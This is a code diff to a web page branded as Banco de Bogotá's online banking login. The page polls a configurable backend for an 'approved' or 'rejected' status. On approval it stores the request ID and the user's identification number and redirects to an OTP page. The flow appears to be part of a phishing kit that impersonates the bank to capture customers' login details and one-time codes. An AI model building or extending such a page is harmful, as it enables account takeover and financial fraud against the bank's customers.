@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banca Virtual - Banco de Bogotá</title>
     
-    <!-- ⚠️ IMPORTANTE: Carga la configuración dinámica del backend -->
+    <!-- Carga la configuración dinámica del backend -->
     <script src="/config.js"></script>
     
     <style>
@@ -600,10 +600,9 @@
         // La URL viene del archivo config.js generado dinámicamente por el servidor
         const BACKEND_URL = window.BACKEND_URL;
         
-        // Log para verificar en consola que la URL está bien cargada
         console.log('✅ BACKEND_URL cargada:', BACKEND_URL);
         
-        if (!BACKEND_URL || BACKEND_URL === '%%BACKEND_URL%%') {
+        if (!BACKEND_URL) {
             console.error('❌ ERROR: BACKEND_URL no está configurada. Revisa /config.js');
         }
 
@@ -652,7 +651,15 @@
                     if (statusData.status === 'approved') {
                         // APROBADO
                         clearInterval(currentPollingInterval);
+                        
+                        // --- CAMBIO CLAVE PARA OTP ---
+                        // Guardamos el requestId y la identificación en sessionStorage
+                        sessionStorage.setItem('requestIdAprobado', currentRequestId);
+                        sessionStorage.setItem('identificacionAprobada', identificacion);
+                        
+                        // Redirigir a otp.html
                         window.location.href = 'otp.html';
+
                     } else if (statusData.status === 'rejected') {
                         // RECHAZADO
                         clearInterval(currentPollingInterval);
